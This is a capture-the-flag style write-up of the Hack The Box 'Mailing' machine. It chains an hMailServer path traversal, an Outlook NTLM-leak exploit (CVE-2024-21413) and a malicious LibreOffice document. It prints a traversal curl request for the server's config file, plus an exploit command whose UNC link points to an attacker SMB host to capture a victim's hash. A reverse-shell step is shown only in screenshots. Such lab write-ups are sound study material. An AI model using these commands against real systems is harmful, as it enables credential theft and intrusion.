---
title: HTB Mailing
slug: mailing
lang: en
platform: Hack The Box
category: Windows
headline: hMailServer LFI, Outlook NTLM leak and LibreOffice macro exploitation
difficulty: Easy
objective: localadmin
date: 2024-10-26
tags: [Windows, LFI, hMailServer, CVE-2024-21413, LibreOffice, CVE-2023-2255]
---

# HTB Mailing

## Executive Summary

Mailing exposes a Windows web application with a file download endpoint vulnerable to path traversal. Reading `hMailServer.ini` reveals mail credentials, which are used to trigger an Outlook-related NTLM leak and capture Maya's hash. After cracking the hash, WinRM provides a shell. Local enumeration finds LibreOffice installed, and a malicious document exploiting CVE-2023-2255 triggers code execution as `localadmin`.

## Web Enumeration and LFI

The target exposed web and mail-related services.

![[Pasted image 20241026185914.png|Initial port scan]]
![[Pasted image 20241026190447.png|Service enumeration]]
![[Pasted image 20241026190510.png|HTTP details]]

The web page exposed potential users and a PDF with instructions.

![[Pasted image 20241026190947.png|Web page with downloadable PDF]]
![[Pasted image 20241026191513.png|Potential user maya]]

The `download.php` endpoint was vulnerable to path traversal against Windows paths.

```bash
curl -s -X GET "http://mailing.htb/download.php?file=..\..\..\..\..\program+files+(x86)\hMailServer\Bin\hMailServer.ini"
```

![[Pasted image 20241026191932.png|LFI probe]]
![[Pasted image 20241026193152.png|hMailServer config path research]]
![[Pasted image 20241026193244.png|Working hMailServer.ini path]]
![[Pasted image 20241026193520.png|Password material in hMailServer.ini]]

The recovered password was cracked as `homenetworkingadministrator`.

![[Pasted image 20241026193710.png|Recovered hMailServer password]]

## Outlook NTLM Leak

Multiple CVE-2024-21413 proof-of-concepts were tested. The working flow sent a malicious message that caused Maya to authenticate to an attacker-controlled SMB share.

```bash
python3 CVE-2024-21413.py \
  --server mailing.htb \
  --port 587 \
  --username administrator@mailing.htb \
  --password homenetworkingadministrator \
  --sender administrator@mailing.htb \
  --recipient maya@mailing.htb \
  --url "\\10.10.16.25\smbFolder\test" \
  --subject 'Verify the email'
```

![[Pasted image 20241026194529.png|CVE-2024-21413 research]]
![[Pasted image 20241026201346.png|SMB server setup]]
![[Pasted image 20241026201620.png|Exploit execution]]
![[Pasted image 20241026210006.png|Maya NTLM hash captured]]

The captured hash was cracked.

```text
maya:m4y4ngs4ri
```

![[Pasted image 20241026210412.png|Hashcat cracking]]
![[Pasted image 20241026210955.png|Maya password recovered]]

WinRM access was valid.

![[Pasted image 20241026211115.png|Share enumeration as Maya]]
![[Pasted image 20241026211426.png|WinRM validation]]
![[Pasted image 20241026211524.png|Evil-WinRM shell]]

## LibreOffice Exploitation

LibreOffice was installed under Program Files and the version was vulnerable.

![[Pasted image 20241026212100.png|LibreOffice installation]]
![[Pasted image 20241026212314.png|Vulnerable LibreOffice version]]

CVE-2023-2255 was used to generate a malicious ODT payload. A Nishang reverse shell was prepared and encoded for Windows PowerShell.

![[Pasted image 20241026213523.png|Payload generation]]
![[Pasted image 20241026213800.png|PowerShell UTF-16LE base64 encoding]]
![[Pasted image 20241026215343.png|Nishang one-liner preparation]]
![[Pasted image 20241026214219.png|Payload adjustment]]
![[Pasted image 20241026214315.png|HTTP server for payload]]
![[Pasted image 20241026214412.png|Exploit ODT generated]]

After uploading the malicious document to `C:\Important Documents`, a callback was received as `localadmin`.

![[Pasted image 20241026214552.png|Netcat listener]]
![[Pasted image 20241026214829.png|ODT upload]]
![[Pasted image 20241026220034.png|Reverse shell received]]
![[Pasted image 20241026220136.png|localadmin flag]]

## Key Takeaways

- Windows path traversal can expose service configuration files with credentials.
- Mail clients may leak NetNTLM material when coerced to access UNC paths.
- Desktop software on servers can become a privilege escalation path through document-based exploits.
